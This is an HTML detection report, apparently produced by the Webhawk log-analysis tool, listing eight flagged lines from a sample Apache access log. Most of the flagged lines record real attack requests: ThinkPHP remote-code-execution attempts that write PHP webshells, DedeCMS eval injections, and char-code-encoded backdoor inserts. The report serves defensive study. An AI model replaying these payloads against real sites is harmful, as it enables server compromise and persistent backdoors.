@@ -1,0 +1,117 @@
+
+        <head>
+            <style>
+                table {
+                    table-layout: fixed;
+                    width: 100%;
+                }
+                td {
+                  padding: 5px;
+                }
+                th {
+                  text-align:left;
+                  padding: 10px;
+                  background-color: whitesmoke;
+                }
+                div {
+                  font-family:monospace;
+                  padding: 50px;
+                }
+            </style>
+        </head>
+    
+            <div>
+                <table width="100%">
+                    <tr>
+                        <td width="50%">
+                            <h1>Webhawk Catch Report</h1>
+                            <p>
+                                Unsupervised learning Web logs/OS processes attack detection.
+                            </p>
+                            Date: 23/06/25 at 19:23:16 GMT
+                            <br>
+                            Log file: SAMPLE_DATA/RAW_APACHE_LOGS/access.log.2021-10-22
+                            <br>
+                            Log type: apache logs
+                            <br>
+                            <h3>Findings: 8</h3>
+                        </td>
+                        <td>
+                            <img src='./scan_plot_access_log_2021-10-22.png'/>
+                        </td>
+                </tr>
+                </table>
+            <table width="100%">
+                <tr style="background:gainsboro;padding:10px">
+                    <td style="width:5%">Severity</td>
+                    <td style="width:8%">Related CVE(s)</td>
+                    <td style="width:4%">Line#</td>
+                    <td style="width:40%">LLM Insights(llama3.2)</td>
+                    <td style="width:43%">Log line</td>
+                </tr>
+
+        
+                <tr>
+                    <td style="background:OrangeRed;text-align:center;color:whitesmoke">High</td>
+                    <td><i>No CVE found</i></td>
+                    <td>317</td>
+                    <td>N/A</td>
+                    <td style="word-break: break-word; white-space: normal;">125.78.229.99 - - [22/Oct/2021:12:27:04 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 328 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible# MSIE 10.0# Windows NT 6.2)" </td>
+                </tr>
+            
+                <tr>
+                    <td style="background:OrangeRed;text-align:center;color:whitesmoke">High</td>
+                    <td><i>No CVE found</i></td>
+                    <td>318</td>
+                    <td>N/A</td>
+                    <td style="word-break: break-word; white-space: normal;">125.78.229.99 - - [22/Oct/2021:12:27:04 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible# MSIE 10.0# Windows NT 6.2)" </td>
+                </tr>
+            
+                <tr>
+                    <td style="background:OrangeRed;text-align:center;color:whitesmoke">High</td>
+                    <td><i>No CVE found</i></td>
+                    <td>324</td>
+                    <td>N/A</td>
+                    <td style="word-break: break-word; white-space: normal;">125.78.229.99 - - [22/Oct/2021:12:27:06 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22#eval($_POST%5Bysy%5D)#die()#// HTTP/1.1" 418 746 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22#eval($_POST[ysy])#die()#//" "Mozilla/5.0 (compatible# MSIE 10.0# Windows NT 6.2)" </td>
+                </tr>
+            
+                <tr>
+                    <td style="background:OrangeRed;text-align:center;color:whitesmoke">High</td>
+                    <td><i>No CVE found</i></td>
+                    <td>329</td>
+                    <td>N/A</td>
+                    <td style="word-break: break-word; white-space: normal;">125.78.229.99 - - [22/Oct/2021:12:27:07 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=ppeeu.php&content=%3C?php%20mb_ereg_replace('.*'#@$_REQUEST%5B_%5D#%20''#%20'e')#?%3E HTTP/1.1" 418 746 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*'#@$_REQUEST[_]# ''# 'e')#?>" "Mozilla/5.0 (compatible# MSIE 10.0# Windows NT 6.2)" </td>
+                </tr>
+            
+                <tr>
+                    <td style="background:OrangeRed;text-align:center;color:whitesmoke">High</td>
+                    <td><i>No CVE found</i></td>
+                    <td>333</td>
+                    <td>N/A</td>
+                    <td style="word-break: break-word; white-space: normal;">125.78.229.99 - - [22/Oct/2021:12:27:08 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=txual.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*'#@$_REQUEST%5B_%5D#%20''#%20'e')#?%3E$ HTTP/1.1" 418 746 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*'#@$_REQUEST[_]# ''# 'e')#?>$" "Mozilla/5.0 (compatible# MSIE 10.0# Windows NT 6.2)" </td>
+                </tr>
+            
+                <tr>
+                    <td style="background:OrangeRed;text-align:center;color:whitesmoke">High</td>
+                    <td><i>No CVE found</i></td>
+                    <td>335</td>
+                    <td>N/A</td>
+                    <td style="word-break: break-word; white-space: normal;">125.78.229.99 - - [22/Oct/2021:12:27:08 -0700] "GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 HTTP/1.1" 404 305 "http://www.secrepo.com/plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0" "Mozilla/5.0 (compatible# MSIE 10.0# Windows NT 6.2)" </td>
+                </tr>
+            
+                <tr>
+                    <td style="background:OrangeRed;text-align:center;color:whitesmoke">High</td>
+                    <td><i>No CVE found</i></td>
+                    <td>336</td>
+                    <td>N/A</td>
+                    <td style="word-break: break-word; white-space: normal;">125.78.229.99 - - [22/Oct/2021:12:27:09 -0700] "GET /plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 418 746 "http://www.secrepo.com/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible# MSIE 10.0# Windows NT 6.2)" </td>
+                </tr>
+            
+                <tr>
+                    <td style="background:OrangeRed;text-align:center;color:whitesmoke">High</td>
+                    <td><i>No CVE found</i></td>
+                    <td>378</td>
+                    <td>N/A</td>
+                    <td style="word-break: break-word; white-space: normal;">203.186.4.114 - - [22/Oct/2021:14:21:53 -0700] "HEAD / HTTP/1.1" 200 388 "-" "Mozilla/5.0 (Windows NT 10.0# Win64# x64) AppleWebKit/537.36 (KHTML# like Gecko) Chrome/79.0.3945.130 Safari/537.36# Dragonbot# http://www.dragonmetrics.com" </td>
+                </tr>
+            </table></div>
